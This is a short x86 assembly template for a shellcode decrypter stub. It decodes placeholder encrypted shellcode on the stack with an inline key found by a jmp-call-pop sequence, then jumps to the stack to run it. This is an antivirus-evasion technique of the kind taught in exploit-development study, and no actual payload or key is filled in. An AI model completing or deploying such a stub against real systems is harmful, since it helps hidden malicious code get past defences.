	section .text
global _start

_start:
	; push encrypted shellcode
	push <ENCRYPTED SHELLCODE>

	jmp getdata
next:	pop ebx

	mov esi, esp
	mov edi, esp
	; place key length
	mov ecx, <KEY LENGTH>

decrypt:
	lodsb
	sub al, byte [ebx]
	inc ebx
	stosb
	loop decrypt

	jmp esp
	; exit
	xor eax, eax
	mov al, 1
	xor ebx, ebx
	int 0x80


getdata: call next
	; Place key on next line
	key db <KEY>

